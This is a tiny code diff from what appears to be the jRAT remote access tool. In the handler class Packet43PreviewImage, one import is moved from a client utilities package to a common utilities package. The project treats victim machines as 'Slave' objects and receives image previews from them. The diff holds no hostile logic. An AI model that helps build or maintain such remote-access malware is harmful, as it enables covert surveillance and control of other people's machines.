@@ -6,7 +6,7 @@ import java.io.DataInputStream;
 
 import se.jrat.client.Slave;
 import se.jrat.client.ui.frames.FramePreviewImage;
-import se.jrat.client.utils.ImageUtils;
+import se.jrat.common.utils.ImageUtils;
 
 public class Packet43PreviewImage extends AbstractIncomingPacket {
 
